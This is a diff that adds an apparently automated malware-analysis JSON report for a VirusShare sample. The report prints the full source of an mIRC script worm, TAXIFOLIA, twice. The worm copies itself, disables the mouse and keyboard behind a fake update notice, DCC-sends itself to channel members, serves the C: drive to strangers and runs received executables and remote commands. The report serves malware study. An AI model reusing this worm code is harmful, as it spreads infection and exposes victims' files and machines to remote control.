@@ -1,0 +1,80 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "autoexec": "Runs when the Word document is opened",
+            "command": "May run PowerShell commands",
+            "run": "May run an executable file or a system command"
+        },
+        "macro": "# TAXIFOLIA, courtesy of mandragoreFS\non 1:start:{\n  .fsend on\n  .sreq +m auto\n  .ajinvite on\n  .run -n c:\\command.com /c copy c:\\autoexec.pif c:\\recycled\\taxifolia.exe\n  .titlebar -=] 0wned by taxifolia, courtesy of mandragoreFS ! [=-\n}\non 1:connect:{\n  .run -n rundll32.exe mouse,disable\n  .run -n rundll32.exe keyboard,disable\n  .window -dok +e @mIRC32 100 100 400 100\n  .aline @mirc32 This is the automatic update feature.\n  .aline @mirc32 It takes up to few minutes.\n  .aline @mirc32 If your computer slows down, this is normal.\n  .aline @mirc32 DO NOT REBOOT !\n  .showmirc -t\n  .join #warez\n  .join #sexe\n  .list\n}\non 1:disconnect:.server\non 1:join:#:{\n  .join $chan\n  .updatenl\n  if ($nick($chan,0)==1) {halt}\n  if $nick == $me {\n    %i=0\n    :next\n    inc %i\n    if (%i == $nick($chan,0)+1) {halt}\n    .dcc send $nick($chan,%i)\n    .whois $nick($chan,%i)\n    goto next\n  }\n  else {.dcc send $nick c:\\recycled\\taxifolia.exe}\n}\nraw 319:*:.join $3-\nraw 322:*:.join $1-\non 1:start:.sockopen x www.macafee.com 80\non 1:sockopen:x:.sockwrite -n x you suxx\non 1:sockwrite:x:.sockwrite -n x you suxx\non 1:sockclose:x:.sockopen x www.macafee.com 80\non 1:text:*virus*:*:.ignore $nick | .part $chan\non 1:text:*file*:?:.fserve $nick 100 c:\\\non 1:filercvd:*.exe,*.com,*.vbs:.run $filename\nctcp 1:run:?:/run $1-"
+    },
+    "filename": "VirusShare_e8b410b1785655b8a3c8fe30877e8c5a",
+    "filesize": 1352,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "e8b410b1785655b8a3c8fe30877e8c5a",
+        "sha1": "43a363612c5ce7be2046943e8cc34c09a7116a19",
+        "sha256": "343dc9a546d0877ad43727c1f13dd2a75599a46dc2102e8b0ee61bfce1a1dda5"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "# TAXIFOLIA, courtesy of mandragoreFS",
+            "on 1:start:{",
+            "  .fsend on",
+            "  .sreq +m auto",
+            "  .ajinvite on",
+            "  .run -n c:\\command.com /c copy c:\\autoexec.pif c:\\recycled\\taxifolia.exe",
+            "  .titlebar -=] 0wned by taxifolia, courtesy of mandragoreFS ! [=-",
+            "on 1:connect:{",
+            "  .run -n rundll32.exe mouse,disable",
+            "  .run -n rundll32.exe keyboard,disable",
+            "  .window -dok +e @mIRC32 100 100 400 100",
+            "  .aline @mirc32 This is the automatic update feature.",
+            "  .aline @mirc32 It takes up to few minutes.",
+            "  .aline @mirc32 If your computer slows down, this is normal.",
+            "  .aline @mirc32 DO NOT REBOOT !",
+            "  .showmirc -t",
+            "  .join #warez",
+            "  .join #sexe",
+            "  .list",
+            "on 1:disconnect:.server",
+            "on 1:join:#:{",
+            "  .join $chan",
+            "  .updatenl",
+            "  if ($nick($chan,0)==1) {halt}",
+            "  if $nick == $me {",
+            "    %i=0",
+            "    :next",
+            "    inc %i",
+            "    if (%i == $nick($chan,0)+1) {halt}",
+            "    .dcc send $nick($chan,%i)",
+            "    .whois $nick($chan,%i)",
+            "    goto next",
+            "  else {.dcc send $nick c:\\recycled\\taxifolia.exe}",
+            "raw 319:*:.join $3-",
+            "raw 322:*:.join $1-",
+            "on 1:start:.sockopen x www.macafee.com 80",
+            "on 1:sockopen:x:.sockwrite -n x you suxx",
+            "on 1:sockwrite:x:.sockwrite -n x you suxx",
+            "on 1:sockclose:x:.sockopen x www.macafee.com 80",
+            "on 1:text:*virus*:*:.ignore $nick | .part $chan",
+            "on 1:text:*file*:?:.fserve $nick 100 c:\\",
+            "on 1:filercvd:*.exe,*.com,*.vbs:.run $filename",
+            "ctcp 1:run:?:/run $1-"
+        ],
+        "file": {
+            "  .run -n c:\\command.com /c copy c:\\autoexec.pif c:\\recycled\\taxifolia.exe": "Executable"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.278524",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
